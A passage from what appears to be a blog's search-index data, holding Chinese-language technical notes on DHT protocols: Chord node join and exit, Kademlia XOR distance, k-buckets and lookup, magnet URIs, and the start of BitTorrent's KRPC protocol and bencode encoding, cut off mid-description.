每一个节点都有个路由表\n\t\t\n\t\t\n\t\t假设当前节点的 ID 是 n，那么表中第 i 项的值是：successor( (n + 2i) mod 2m ) 当收到请求（key），就到“Finger Table”中找到【最大的且不超过 key】的那一项，然后把 key 转发给这一项对应的节点。有了“Finger Table”之后，时间复杂度可以优化为 O(log N)。`跳跃式查询`\n\t\t\n\n+ 节点的加入\n\n\t- 任何一个新来的节点（假设叫 A），需要先跟 DHT 中已有的任一节点（假设叫 B）建立连接。\n\t- A 随机生成一个散列值作为自己的 ID（对于足够大的散列值空间，ID 相同的概率忽略不计）\n\t- A 通过跟 B 进行查询，找到自己这个 ID 在环上的接头人。也就是——找到自己这个 ID 对应的“继任”（假设叫 C）与“前任”（假设叫 D）\n\t- 　接下来，A 需要跟 C 和 D 进行一系列互动，使得自己成为 C 的前任，以及 D 的继任。这个互动过程，大致类似于在双向链表当中插入元素\n\n+ 节点的【正常】退出\n\n\t- 如果某个节点想要主动离开这个 DHT 网络，按照约定需要作一些善后的处理工作。比如说，通知自己的前任去更新其继任者......\n　　这些善后处理，大致类似于在双向链表中删除元素\n\n+ 节点的【异常】退出\n\n\t- 作为一个分布式系统，任何节点都有可能意外下线（也就是说，来不及进行善后就挂掉了）\n\n\t\t假设 节点A 的继任者【异常】下线了，那么 节点A 就抓瞎了。咋办捏？为了保险起见，Chord 引入了一个“继任者候选列表”的概念。每个节点都用这个列表来包含：距离自己最近的 N 个节点的信息，顺序是【由近到远】。一旦自己的继任者下线了，就在列表中找到一个【距离最近且在线】的节点，作为新的继任者。然后 节点A 更新该列表，确保依然有 N 个候选。更新完“继任者候选列表”后，节点A 也会通知自己的前任，那么 A 的前任也就能更新自己的“继任者候选列表”。\n\t\t\n\t\t\n### 4. Kademlia（Kad）协议\n\n\n+ 拓扑结构——二叉树\n\n\t- 散列值的预处理\n\n\t\tKad 也采用了“node ID 与 data key 同构”的设计思路。然后 Kad 采用某种算法把 key 映射到一个二叉树，每一个 key 都是这个二叉树的【叶子】。在映射之前，先做一下预处理。\n\t\t1. 先把 key 以二进制形式表示。\n\t\t2. 把每一个 key 缩短为它的【最短唯一前缀】。\n\n\t\n\t- 散列值的映射\n\n\t\t完成上述的预处理后，接下来的映射规则是：\n\t\n\t\t1. 先把 key 以二进制形式表示，然后从高位到低位依次处理。\n\t\t2. 二进制的第 n 个数位就对应了二叉树的第 n 层\n\t\t3. 如果该位是1，进入左子树，是0则进入右子树（这只是人为约定，反过来处理也可以）\n\t\t4. 全部数位都处理完后，这个 key 就对应了二叉树上的某个【叶子】\n\n+ 距离算法——异或（XOR）\n\n\t接下来要聊的是 Kad 最精妙之处——采用 XOR（按比特异或操作）算法计算 key 之间的“距离”。这种搞法使得它具备了类似于“几何距离”的某些特性（下面用 ⊕ 表示 XOR）\n\t\n\t```\n\t(A ⊕ B) == (B ⊕ A)\tXOR 符合“交换律”，具备对称性。相比之下，Chord 的距离算法不对称\n\t(A ⊕ A) == 0\t反身性，自身距离为零\n\t(A ⊕ B) > 0\t【不同】的两个 key 之间的距离必大于零\n\t(A ⊕ B) + (B ⊕ C) >= (A ⊕ C)\t三角不等式\n\t```\n\t\n+ 路由机制\n\n\t+ 二叉树的拆分\n\n\t对每一个节点，都可以【按照自己的视角】对整个二叉树进行拆分。\n\t\n\t拆分的规则是：先从根节点开始，把【不包含】自己的那个子树拆分出来；然后在剩下的子树再拆分不包含自己的下一层子树；以此类推，直到最后只剩下自己。\n\t\n\tKad 默认的散列值空间是 m=160（散列值有 160 比特），因此拆分出来的子树【最多】有 160 个（考虑到实际的节点数【远远小于】2160，子树的个数会明显小于 160）。\n\t\n\t对于每一个节点而言，当它以自己的视角完成子树拆分后，会得到 n 个子树；对于每个子树，如果它都能知道里面的一个节点，那么它就可以利用这 n 个节点进行递归路由，从而到达整个二叉树的【任何一个】节点\n\t\n+ K-桶（K-bucket） \n\n\t每个节点在完成子树拆分后，只需要知道每个子树里面的一个节点，就足以实现全遍历。但是考虑到健壮性（请始终牢记：分布式系统的节点是动态变化滴），光知道【一个】显然是不够滴，需要知道【多个】才比较保险。\n\t\n\t所以 Kad 论文中给出了一个“K-桶（K-bucket）”的概念。也就是说：每个节点在完成子树拆分后，要记录每个子树里面的 K 个节点。这里所说的 K 值是一个【系统级】的常量。由使用 Kad 的软件系统自己设定（比如 BT 下载使用的 Kad 网络，K 设定为 8）。\n\t\n\tK 桶其实就是【路由表】。对于某个节点而言，如果【以它自己为视角】拆分了 n 个子树，那么它就需要维护 n 个路由表，并且每个路由表的【上限】是 K。说 K 只是一个【上限】，是因为有两种情况使得 K 桶的尺寸会小于 K。\n\t1. 距离越近的子树就越小。如果整个子树【可能存在的】节点数小于 K，那么该子树的 K 桶尺寸永远也不可能达到 K。\n\t2. 有些子树虽然实际上线的节点数超过 K，但是因为种种原因，没有收集到该子树足够多的节点，这也会使得该子树的 K 桶尺寸小于 K。\n\t\n+ K-桶（K-bucket）的刷新机制\n\n\t+ `主动收集节点`　\t\t　\n\t\t\n\t\t任何节点都可以主动发起“查询节点”的请求（对应于协议类型 FIND_NODE），从而刷新 K 桶中的节点信息\n\t\t\n\t+ `被动收集节点`\n\n\t\t如果收到其它节点发来的请求（协议类型 FIND_NODE 或 FIND_VALUE），会把对方的 ID 加入自己的某个 K 桶中。 \n\t\t\n\t+ `探测失效节点`\n\t\n\t\tKad 还是支持一种探测机制（协议类型 PING），可以判断某个 ID 的节点是否在线。因此就可以定期探测路由表中的每一个节点，然后把下线的节点从路由表中干掉。\n\n\n+ “并发请求”与“α 参数”\n\n\t“K桶”的这个设计思路【天生支持并发】。因为【同一个】“K桶”中的每个节点都是平等的，没有哪个更特殊；而且对【同一个】“K桶”中的节点发起请求，互相之间没有影响（无耦合）。\n\t\n\t所以 Kad 协议还引入了一个“α 参数”，默认设置为 3，使用 Kad 的软件可以在具体使用场景中调整这个 α 因子。\n\t\n\t当需要路由到某个“子树”，会从该子树对应的“K桶”中挑选【α 个节点】，然后对这几个节点【同时】发出请求。这么做有啥好处捏？俺在本文末尾聊“性能”和“安全性”时会具体介绍。\n\t\n+ 节点的加入\n\t\n\t- 任何一个新来的节点（假设叫 A），需要先跟 DHT 中已有的任一节点（假设叫 B）建立连接。\n\t- A 随机生成一个散列值作为自己的 ID（对于足够大的散列值空间，ID 相同的概率忽略不计）\n\t- A 向 B 发起一个查询请求（协议类型 FIND_NODE），请求的 ID 是自己（通俗地说，就是查询自己）\n\t- B 收到该请求之后，（如前面所说）会先把 A 的 ID 加入自己的某个 K 桶中。然后，根据 FIND_NODE 协议的约定，B 会找到【K个】最接近 A 的节点，并返回给 A。（B 怎么知道哪些节点接近 A 捏？这时候，【用 XOR 表示距离】的算法就发挥作用啦）\n\t- A 收到这 K 个节点的 ID 之后，（仅仅根据这批 ID 的值）就可以开始初始化自己的 K 桶。\n\t- 然后 A 会继续向刚刚拿到的这批节点发送查询请求（协议类型 FIND_NODE），如此往复（递归），直至 A 建立了足够详细的路由表。\n\n+ 节点的退出\n\t\n\t与 Chord 不同，Kad 对于节点退出没有额外的要求（没有“主动退出”的说法）。\n　　所以，Kad 的节点想离开 DHT 网络不需要任何操作（套用徐志摩的名言：悄悄的我走了，正如我悄悄的来）\n\n\n\n### 5. 参考资料\n\n+ https://colobu.com/2018/03/26/distributed-hash-table/\n+ https://program-think.blogspot.com/2017/09/Introduction-DHT-Kademlia-Chord.html\n\n","tags":["dht"],"categories":["BitTorrent"]},{"title":"Kademlia_DHT_KRPC_BitTorrent协议","url":"%2Fp%2F1ea24e2a.html","content":"\n# 0.引言\n\n平常我们高端用户都会用到BT工具来分享一些好玩的资源，例如ubuntu 13.04的ISO安装盘，一些好听的音乐等。这个时候我们会进入一个叫做P2P的网络，大家都在这个网络里互相传递数据，这种分布式的数据传输解决了HTTP、FTP等单一服务器的带宽压力。以往的BT工具（包括现在也有）在加入这个P2P网络的时候都需要借助一个叫Tracker的中心服务器，这个服务器是用来登记有哪些用户在请求哪些资源，然后让请求同一个资源的用户都集中在一起互相分享数据，形成的一个集群叫做Swarm。\n\n这种工作方式有一个弊端就是一旦Tracker服务器出现故障或者线路遭到屏蔽，BT工具就无法正常工作了。所以聪明的人类后来发明了一种叫做DHT（Distributed Hash Table）的去中心化网络。每个加入这个DHT网络的人都要负责存储这个网络里的资源信息和其他成员的联系信息，相当于所有人一起构成了一个庞大的分布式存储数据库。在DHT里定位一个用户和定位一个资源的方法是一样的，他们都使用SHA－1产生的哈希值来作标识。\n\n\n### 0x1: Kademlia/DHT/KRPC/BitTorrent之间的关系\n\nKademlia是一个最初提出的框架和理论基础，P2P对等资源共享的思想从这里开始衍生，DHT和KRPC是在Kademlia的基础上进行了包装和发展，BitTorrent是在这三者之上的文件共享分发协议。\n\n<!-- more -->\n\n### 0x2: Magnet URI格式\n\n```\nmagnet:?xt=urn:btih:<info-hash>&dn=<name>&tr=<tracker-url>\n\n1. <info-hash>: Infohash的16进制编码，共40字符。为了与其它的编码兼容，客户端应当也支持32字符的infohash base32编码 \n2. Xt是唯一强制的参数\n3. dn是在等待metadata时可能供客户端显示的名字\n4. 如果只有一个字段，Tr是tracker的url，如果有很多的tracker，那么多个tr字段会被包含进去 \n# dn和tr都是可选的 \n```\n如果没有指定tracker，客户端应使用DHT来获取peers\n\n\n### 0x3:P2P的含义\n\n从第一个P2P应用系统Napster的出现开始，P2P技术掀起的风暴为互联网带来了一场空前的变革。P2P不是一个全新的概念，P2P理念的起源可以追溯到20世纪80年代。目前，在学术界、工业界对于P2P没有一个统一的定义。Peer在英语里有“(地位、能力等)同等者”、“同事”和“伙伴”等意义，这样一来，P2P也就可以理解为“伙伴对伙伴”的意思，或称为对等网 \n\n严格地定义纯粹的P2P网络，它是指完全分布的系统，每一个节点都是在功能上和任务上完全相同的。但是这样的定义就会排除掉一些使用“超级节点”的系统或者一些使用中央服务器做一些非核心任务的系统。广义的定义里面指出P2P是一种能善于利用互联网上的存储、CPU周期、内容和用户活动等各种资源的一类应用程序[3]，包括了一些依赖中央服务器才能工作的系统 \n\nP2P这个定义并不是从系统的结构或者内部的操作特征出发考虑的，而是从人们外在的感知角度出发，如果一个系统从直观上看是各个计算机之间直接互相联系的就可以被叫做P2P。当前，技术上比较权威的定义为，P2P系统是一个由直接相连的节点们所构成的分布式的系统[4]，这些节点能够为了共享内容、CPU 时间、存储或者带宽等资源而自我形成一定的网络拓扑结构，能够在适应节点数目的变化和失效的同时维持可以接受的链接能力和性能，并且不需要一个全局服务器或者权威的中介的支持。本文从人们感知的角度出发，采用P2P的广义定义\n\n\n# 1. Kademlia协议\n\n### 0x1: Kademlia\n\nKademlia是一种通过分散式杂凑表实现的协议算法，它是由Petar和David为非集中式P2P计算机网络而设计的\n\n```\n1. Kademlia规定了网络的结构，也规定了通过节点查询进行信息交换的方式\n2. Kademlia网络节点之间使用UDP进行通讯\n3. 参与通讯的所有节点形成一张虚拟网(或者叫做覆盖网)。这些节点通过一组数字(或称为节点ID)来进行身份标识\n4. 节点ID不仅可以用来做身份标识，还可以用来进行值定位(值通常是文件的散列或者关键词)\n5. <font color=red>其实，节点ID与文件散列直接对应，它所表示的那个节点存储着哪儿能够获取文件和资源的相关信息</font>\n6. 当我们在网络中搜索某些值(即通常搜索存储文件散列或关键词的节点)的时候，Kademlia算法需要知道与这些值相关的键，然后分步在网络中开始搜索。每一步都会找到一些节点，这些节点的ID与键更为接近，如果有节点直接返回搜索的值或者再也无法找到与键更为接近的节点ID的时候搜索便会停止。这种搜索值的方法是非常高效的\n7. 与其他的分散式杂凑表的实现类似，在一个包含n个节点的系统的值的搜索中，Kademlia仅访问O(log(n))个节点。非集中式网络结构还有更大的优势，那就是它能够显著增强抵御拒绝服务攻击的能力。即使网络中的一整批节点遭受泛洪攻击，也不会对网络的可用性造成很大的影响，通过绕过这些漏洞(被攻击的节点)来重新编织一张网络，网络的可用性就可以得到恢复 \n```\n\n### 0x2: p2p网络架构演进\n\n```\n1. 第一代P2P文件分享网络，像Napster，依赖于中央数据库来协调网络中的查询\n2. 第二代P2P网络，像Gnutella，使用泛滥式查询(query flooding)来查询文件，它会搜索网络中的所有节点\n3. 第三代p2p网络使用分散式杂凑表来查询网络中的文件，分散式杂凑表在整个网络中储存资源的位置\n```\n\n这些协议追求的主要目标就是快速定位期望的节点。Kademlia基于两个节点之间的距离计算，该距离是\"两个网络节点ID号的异或\"，计算的结果最终作为整型数值返回。关键字和节点ID有同样的格式和长度，因此，可以使用同样的方法计算关键字和节点ID之间的距离。节点ID一般是一个大的随机数，选择该数的时候所追求的一个目标就是它的唯一性(希望在整个网络中该节点ID是唯一的)。异或距离跟实际上的地理位置没有任何关系，只与ID相关。因此很可能来自德国和澳大利亚的节点由于选择了相似的随机ID而成为邻居。选择异或是因为通过它计算的距离享有几何距离公式的一些特征，尤其体现在以下几点\n\n```\n1. 节点和它本身之间的异或距离是0\n2. 异或距离是对称的：即从A到B的异或距离与从B到A的异或距离是等同的\n3. 异或距离符合三角不等式: 三个顶点A B C，AC异或距离小于或等于AB异或距离和BC异或距离之和，这种几何数学特征，可以很好的支撑算法进行寻路路由\n```\n\n由于以上的这些属性，在实际的节点距离的度量过程中计算量将大大降低。Kademlia搜索的每一次迭代将距目标至少更近1 bit(每次根据XOR结果，往前选择1bit更近的节点)。一个基本的具有2的n次方个节点的Kademlia网络在最坏的情况下只需花n步就可找到被搜索的节点或值\n\n\n>因为Kademlia是根据bit位XOR计算得到\"相对距离\"的，对于越低bit位，XOR可能得到的结果越小，对于越高位的bit位，XOR可能得到的值就越大，并且是呈现2的指数方式增长的，所以，从数学上来说，一个DHT网络中的所有节点，通过这种方式(XOR距离)进行寻址，每次前进一个bit，最大只需要log2N次即可到达目标节点(log2逼近的思路，即bit 2可以表示世界上任何数字)\n\n### 0x3: 路由表(就是K桶,存放端口)\n\nKademlia路由表由多个列表组成，<font color=red>每个列表对应节点ID的一位(例如: 假如节点ID共有6位，则节点的路由表将包含6个列表)，</font><font color=green>一个列表中包含多个条目，条目中包含定位其他节点所必要的一些数据。列表条目中的这些数据通常是由其他节点的IP地址，端口和节点ID组成。</font>这里仔细思考一下\n\n\n1. 节点ID的一位就是1bit，假设我们的节点ID是: 111000\n2. 对第一个K桶来说，它的列表中的条目必须第一bit不能是1，因为第一个K桶的含义是和该节点的距离是最远的一个分组，第一位不为1，它背后的含义是该分组里的节点和该节点的距离至少在2^6以上，它代表了整个网络中和该节点逻辑距离最远的一些节点 它的列表条目是这样的: 0 00000 ~ 0 111111\n3. 对第二个K桶来说，它的列表中的条目的第一位必须是1，表示和当前节点的第一bit相同，第二bit不能是1，这样代表的意思是第二个K桶里的节点和该节点的距离是介于MAX(2bit)和MIN(1bit)之间的距离，它的列表条目是这样的: 10 0000 ~ 10 1111\n4. 第三个K桶的情况和前2个相同  \n5. 对第四个K桶的来说，它的列表中的条目前三位都是1，第四位不是0，它的列表条目是这样的: 1111 00 ~ 1111 11\n6. 后面的bit位情况类推，可以看出，<font color=red>越低bit位的K桶的MAX(XOR)就越小，它的可变范围就越小了。这代表了越低bit位的K桶里存储的都是距离当前节点越近的Nod节点</font>\n\n\n而条目列表以节点ID的一位(即1bit)来分组是有道理的：我们使用log2N的指数分级方法把除当前节点的全网所有节点都进行了分组，当别的节点来向当前节点请求某个资源HASH的时候，将待搜索寻址的\"目标节点ID\"和路由表进行异或，会有2种情况\n\n1. 找到某个条目和目标节点XOR为0，即已经寻址成功，则直接返回这个条目给requester即可\n2. <font color=red>如果没找到XOR结果为0的条目，则选取那个XOR值最小的条目对应的K桶中的K个条目返回给requester，因为这些条目是最有可能存储了目标节点ID条目的</font>\n\n\n每个列表对应于与节点相距\"特定范围距离\"的一些节点，节点的第n个列表中所找到的节点的第n位与该节点的第n位肯定不同，而前n-1位相同\n\n```\n1. 这就意味着很容易使用网络中远离该节点的一半节点来填充第一个列表(第一位不同的节点最多有一半)\n2. 而用网络中四分之一的节点来填充第二个列表(比第一个列表中的那些节点离该节点更近一位)\n3. 依次类推。如果ID有128个二进制位，则网络中的每个节点按照不同的异或距离把其他所有的节点分成了128类，ID的每一位对应于其中的一类\n```\n\n随着网络中的节点被某节点发现，它们被逐步加入到该节点的相应的列表中，这个过程中包括\n\n1. <font color=red>向节点列表中存信息: 录入别的节点发布的声明</font>\n2. 从节点列表中取信息的操作\n3. 甚至还包括当时协助其他节点寻找相应键对应值的操作: 转发其他节点的寻址请求\n\n\n这个过程中发现的所有节点都将被加入到节点的列表之中，因此节点对整个网络的感知是动态的，这使得网络一直保持着频繁地更新，增强了抵御错误和攻击的能力\n\n---\n\n在Kademlia相关的论文中，列表也称为K桶，其中K是一个系统变量，如20，每一个K桶是一个最多包含K个条目的列表，也就是说，网络中所有节点的一个列表(对应于某一位，与该节点相距一个特定的距离)最多包含20个节点。随着对应的bit位变低(即对应的异或距离越来越短)(bit位越小，可能的距离MAX值就越小了，即距离目标节点的距离越近)，K桶包含的可能节点数迅速下降(K定义的是该bit对应的列表最多能存储K个条目，但不一定都是K存满，当到最低几个bit位的时候，K桶里可能就只有几个个位数的条目了)。由于网络中节点的实际数量远远小于可能ID号的数量，所以对应那些短距离的某些K桶可能一直是空的(如果异或距离只有1，可能的数量就最大只能为1，这个异或距离为1的节点如果没有发现，则对应于异或距离为1的K桶则是空的)\n\n\n![1](Kademlia_DHT_KRPC_BitTorrent协议/1.png)\n\n从这个逻辑图中可以看出\n\n```\n1. 节点的HASH值决定了它们的逻辑距离，即Kademlia网络中的下一跳寻址是根据HASH XOR的值范围(数值大小范围)结果决定的\n2. 该网络最大可有2^3，即8个关键字和节点，目前共有7个节点加入，每个节点用一个小圈表示(在树的底部)\n3. 考虑那个用黑圈标注的节点6，它共有3个K桶(即3bit位)\n\n节点0，1和2(二进制表示为000，001和010)是第一个K桶的候选节点\n000 -> 110: 6\n001 -> 110: 5\n010 -> 110: 4\n\n节点3目前(二进制表示为011)还没有加入网络\n\n节点4和节点5(二进制表示分别为100和101)是第二个K桶的候选节点\n100 -> 110: 2\n101 -> 110: 1 \n\n节点7(二进制表示为111)是第3个K桶的候选节点\n111 -> 110: 1\n```\n\n图中3个K桶都用灰色圈表示，假如K桶的大小(即K值)是2，那么第一个K桶只能包含3个节点中的2个。众所周知，那些长时间在线连接的节点未来长时间在线的可能性更大，基于这种静态统计分布的规律，Kademlia选择把那些长时间在线的节点存入K桶，这一方法增长了未来某一时刻有效节点的数量(hot hint)，同时也提供了更为稳定的网络。当某个K桶已满，而又发现了相应于该桶的新节点的时候，那么，就首先检查K桶中最早访问的节点，假如该节点仍然存活，那么新节点就被安排到一个附属列表中(作为一个替代缓存). 只有当K桶中的某个节点停止响应的时候，替代cache才被使用。换句话说，新发现的节点只有在老的节点消失(失效)后才被使用\n\n\n### 0x4: 协议消息\n\nKademlia协议共有四种消息\n\n```\n1. PING消息: 用来测试节点是否仍然在线\n2. STORE消息: 在某个节点中存储一个键值对\n3. FIND_NODE消息: 消息请求的接收者将返回自己桶中离请求键值最近的K个节点: 将请求者请求的节点HASH和自己的HASH进行XOR计算，将计算结果\n4. FIND_VALUE消息: 与FIND_NODE一样，不过当请求的接收者存有请求者所请求的键的时候，它将返回相应键的值\n```\n\n每一个RPC消息中都包含一个发起者加入的随机值，这一点确保响应消息在收到的时候能够与前面发送的请求消息匹配\n\n\n### 0x5: 定位节点\n\n节点查询可以异步进行，也可以同时进行，同时查询的数量由α表示，一般是3\n\n\n1. 在节点查询的时候，它先得到它K桶中离所查询的键值最近的K个节点(XOR值最小的那个条目所在的分组)，然后向这K个节点发起FIND_NODE消息请求(因为这个K桶内的节点最有可能寻址成功)\n2. 消息接收者收到这些请求消息后将在他们的K桶中进行查询，如果他们知道离被查键更近的节点，他们就返回这些节点(最多K个)\n    + 找到某个条目和目标节点XOR为0，即已经寻址成功，则直接返回这个条目给requester即可\n    + 如果没找到XOR结果为0的条目，则选取那个XOR值最小的条目对应的K桶中的K个条目返回给requester，因为这些条目是最有可能存储了目标节点ID条目的\n3. <font color=\"red\">消息的请求者在收到响应后将使用它所收到的响应结果来更新它的结果列表，返回的结果也应该插入到刚才发起请求的那个K桶里，这个结果列表总是保持K个响应FIND_NODE消息请求的最优节点(即离被搜索键更近的K个节点)</font>\n4. 然后消息发起者将向这K个最优节点发起查询，因为刚开始的查询很可能K桶里存的不全是目标节点，而是潜在地离目标节点较近的节点\n5. 不断地迭代执行上述查询过程。因为每一个节点比其他节点对它周边的节点有更好的感知能力(水波扩散式的节点寻址方式)，因此响应结果将是一次一次离被搜索键值越来越近的某节点。如果本次响应结果中的节点没有比前次响应结果中的节点离被搜索键值更近了(即发现这轮查询的结果未发生diff变化了)，这个查询迭代也就终止了\n6. 当这个迭代终止的时候，响应结果集中的K个最优节点就是整个网络中离被搜索键值最近的K个节点(从以上过程看，这显然是局部的，而非整个网络，因为这本质和最优解搜索算法一样，可能陷入局部最优解而无法获得全局最优解) \n7. 节点信息中可以增加一个往返时间，或者叫做RTT的参数，这个参数可以被用来定义一个针对每个被查询节点的超时设置，即当向某个节点发起的查询超时的时候，另一个查询才会发起，当然，针对某个节点的查询在同一时刻从来不超过α个\n\n\n### 0x6: 定位和冗余拷贝资源\n\n通过把资源信息与键进行映射，资源即可进行定位，杂凑表是典型的用来映射的手段。由于以前的STORE消息，存储节点将会有对应STORE所存储的相关资源的信息。定位资源时，如果一个节点存有相应的资源的值的时候，它就返回该资源，搜索便结束了，除了该点以外，定位资源与定位离键最近的节点的过程相似\n\n\n1. 考虑到节点未必都在线的情况，资源的值被存在多个节点上(节点中的K个)，并且，为了提供冗余，还有可能在更多的节点上储存值\n2. 储存值的节点将定期搜索网络中与储存值所对应的键接近的K个节点并且把值复制到这些节点上，这些节点可作为那些下线的节点的补充\n3. 另外，对于那些普遍流行的内容，可能有更多的请求需求，通过让那些访问值的节点把值存储在附近的一些节点上(不在K个最近节点的范围之类)来减少存储值的那些节点的负载，这种新的存储技术就是缓存技术，通过这种技术，依赖于请求的数量，资源的值被存储在离键越来越远的那些节点上(资源热度越高，缓存cache就越广泛)，这使得那些流行的搜索可以更快地找到资源的储存者\n5. 由于返回值的节点的NODE_ID远离值所对应的关键字，网络中的\"热点\"区域存在的可能性也降低了。依据与键的距离，缓存的那些节点在一段时间以后将会删除所存储的缓存值。DHT的某些实现(如Kad)即不提供冗余(复制)节点也不提供缓存，这主要是为了能够快速减少系统中的陈旧信息。在这种网络中，提供文件的那些节点将会周期性地更新网络上的信息(通过NODE_LOOKUP消息和STORE消息)。当存有某个文件的所有节点都下线了，关于该文件的相关的值(源和关键字)的更新也就停止了，该文件的相关信息也就从网络上完全消失了 \n\n\n### 0x7: 加入网络\n\n1. 想要加入网络的节点首先要经历一个引导过程。在引导过程中，节点需要知道其他已加入该网络的某个节点的IP地址和端口号(可从用户或者存储的列表中获得)。假如正在引导的那个节点还未加入网络，它会计算一个目前为止还未分配给其他节点的随机ID号，直到离开网络，该节点会一直使用该ID号 \n2. 正在加入Kademlia网络的节点在它的某个K桶中插入引导节点(加入该网络的介绍人)(负责加入节点的初始化工作)，然后向它的唯一邻居(引导节点)发起NODE_LOOKUP操作请求来定位自己，这种\"自我定位\"将使得Kademlia的其他节点(收到请求的节点)能够使用新加入节点的Node Id填充他们的K桶(邻居互相认识)\n3. 同时也能够使用那些查询过程的中间节点(位于新加入节点和引导节点的查询路径上的其他节点)来填充新加入节点的K桶(相当于完成一个DNS递归查询后，沿途路径上的DNS IP都被记录了)。想象一下这个过程\n    + 新加入的节点可能和\"引导节点\"距离很远，它一上来就向离自己几何距离最远的引导节点问话: \"谁知道我自己这个节点在哪?\"，引导节点会尽力去回答这个问题，即引导节点会把自己K桶内最有可能知道该节点位置(即离该几点XOR几何距离最近的K个点返回给新加入的请求节点)\n    + <font color=\"red\">新加入的请求方收到了K个节点后，把这K个节点保存进自己的K桶，然后继续向这些节点去\"询问(发起find_node请求)\"自己的节点在哪，这些节点会收到这些请求，同时也把新加入节点保存进自己的K桶内</font>\n    + 整个过程和向DNS根域名服务器请求解析某个域名的递归过程类似\n4. 这一自查询过程使得新加入节点自引导节点所在的那个K桶开始，由远及近，对沿途的所有节点逐步得到刷新，整条链路上的邻居都认识了这个新邻居\n5. 最初的时候，节点仅有一个K桶(覆盖所有的ID范围)，当有新节点需要插入该K桶时，如果K桶已满，K桶就开始分裂，分裂发生在节点的K桶的覆盖范围(表现为二叉树某部分从左至右的所有值)包含了该节点本身的ID的时候。对于节点内距离节点最近的那个K桶，Kademlia可以放松限制(即可以到达K时不发生分裂)，因为桶内的所有节点离该节点距离最近，这些节点个数很可能超过K个，而且节点希望知道所有的这些最近的节点。因此，在路由树中，该节点附近很可能出现高度不平衡的二叉子树。假如K是20，新加入网络的节点ID为\"xxx000011001\"，则前缀为\"xxx0011...\"的节点可能有21个，甚至更多，新的节点可能包含多个含有21个以上节点的K桶(位于节点附近的k桶)。这点保证使得该节点能够感知网络中附近区域的所有节点\n\n\n### 0x8: 查询加速\n\n\n1. Kademlia使用异或来定义距离。两个节点ID的异或(或者节点ID和关键字的异或)的结果就是两者之间的距离。对于每一个二进制位来说，如果相同，异或返回0，否则，异或返回1。异或距离满足三角形不等式: 任何一边的距离小于(或等于)其它两边距离之和\n2. 异或距离使得Kademlia的路由表可以建在单个bit之上，即可使用位组(多个位联合)来构建路由表。位组可以用来表示相应的K桶，它有个专业术语叫做前缀，对一个m位的前缀来说，可对应2^m-1个K桶(m位的前缀本来可以对应2^m个K桶)另外的那个K桶可以进一步扩展为包含该节点本身ID的路由树\n3. 一个b位的前缀可以把查询的最大次数从logn减少到logn/b。这只是查询次数的最大值，因为自己K桶可能比前缀有更多的位与目标键相同，这会增加在自己K桶中找到节点的机会，假设前缀有m位，很可能查询一个节点就能匹配2m甚至更多的位组，所以其实平均的查询次数要少的多 \n4. 节点可以在他们的路由表中使用混合前缀，就像eMule中的Kad网络。如果以增加查询的复杂性为代价，Kademlia网络在路由表的具体实现上甚至可以是有异构的\n\n\n### 0x9: 在文件分享网络中的应用\n\nKademlia可在文件分享网络中使用，通过制作Kademlia关键字搜索，我们能够在文件分享网络中找到我们需要的文件以供我们下载。由于没有中央服务器存储文件的索引，这部分工作就被平均地分配到所有的客户端中去\n\n\n\n1. 假如一个节点希望分享某个文件，它先根据文件的内容来处理该文件，通过运算，把文件的内容散列成一组数字，该数字在文件分享网络中可被用来标识文件\n2. <font color=\"red\">这组散列数字必须和节点ID有同样的长度，然后，该节点便在网络中搜索ID值与文件的散列值相近的节点，然后向这些被搜索到的节点广播自己(即把它自己的IP地址存储在那些搜索到的节点上)，本质意思是说: \"你如果要搜索这个文件，就去找那些节点ID就好了，那些节点ID会告诉搜索者应该到自己这里来(文件发布者)来建立TCP连接，下载文件\"，</font><font color=\"blue\">也就是说，它把自己作为文件的源进行了发布(文件共享方式)。正在进行文件搜索的客户端将使用Kademlia协议来寻找网络上ID值与希望寻找的文件的散列值最近的那个节点(寻找文件的过程和寻找节点的机制形成了统一，因为文件和节点的ID的HASH格式是一样的)，然后取得存储在那个节点上的文件源列表</font> \n3. 由于一个键(HASH)可以对应很多值，即同一个文件(通过一个对应的HASH公布到P2P网络中)可以有多个源(因为可能有多个节点都会有这个文件的拷贝)，每一个存储源列表的节点可能有不同的文件的源的信息，这样的话，源列表可以从与键值相近的K个节点获得。 文件的散列值通常可以从其他的一些特别的Internet链接的地方获得，或者被包含在从其他某处获得的索引文件中(即种子文件)\n4. 文件名的搜索可以使用关键词来实现，文件名可以分割成连续的几个关键词，这些关键词都可以散列并且可以和相应的文件名和文件散列储存在网络中。搜索者可以使用其中的某个关键词，联系ID值与关键词散列最近的那个节点，取得包含该关键词的文件列表。由于在文件列表中的文件都有相关的散列值，通过该散列值就可利用上述通常取文件的方法获得要搜索的文件\n\n\n# 2. KRPC 协议 KRPC Protocol\n\nKRPC是BitTorrent在Kademlia理论基础之上定义的一个通信消息格式协议，主要用来支持peer节点的获取(get_peer)和peer节点的声明(announce_peer)，以及判活心跳(ping)、节点寻址(find_node)，它在find_node的原理上和DHT是一样的，同时增加了get_peer/announce_peer/ping协议的支持\n\nKRPC协议是由B编码组成的一个简单的RPC结构，有4种请求：ping、find_node、get_peers 和 announce_peer\n\n\n### 0x0: bencode编码\n\nbencode 有 4 种数据类型: string, integer, list 和 dictionary\n\n```\n1. string: 字符是以这种方式编码的: <字符串长度>:<字符串> \n如 hell: 4:hell\n\n2. integer: 整数是一这种方式编码的: i<整数>e \n如 1999: i1999e\n\n3. list: 列表是一这种方式编码的: l[数据1][数据2][数据3][…]e \n如列表 [hello, world, 101]：l5:hello5:worldi101ee\n\n4. dictionary: 字典是一这种方式编码的: d[key1][value1][key2][value2][…]e，其中 key 必须是 string 而且按照字母顺序排序 \n如字典 {aa:100, bb:bb, cc:200}： d2:aai100e2:bb2:bb2:cci200ee\n```\n\nKRPC 协议是由 bencode 编码组成的一个简单的 RPC 结构，他使用 UDP 报文发送。一个独立的请求包被发出去然后一个独立的包被回复。这个协议没有重发(UDP是无连接协议)\n\n\n### 0x1: KRPC字典基本组成元素\n\n一条 KRPC 消息即可能是request，也可能是response，由一个独立的字典组成\n\n```\n1. t关键字: 每条消息都包含 t 关键字，它是一个代表了 transaction ID 的字符串。transaction ID 由请求节点产生，并且回复中要包含回显该字段(挑战-响应模型)，所以回复可能对应一个节点的多个请求。transaction ID 应当被编码为一个短的二进制字符串，比如 2 个字节，这样就可以对应 2^16 个请求\n2. y关键字: 它由一个字节组成，表明这个消息的类型。y 对应的值有三种情况\n    1) q 表示请求(请求Queries): q类型的消息它包含 2 个附加的关键字 q 和 a\n        1.1) 关键字 q: 是字符串类型，包含了请求的方法名字(get_peers/announce_peer/ping/find_node)\n        1.2) 关键字 a: 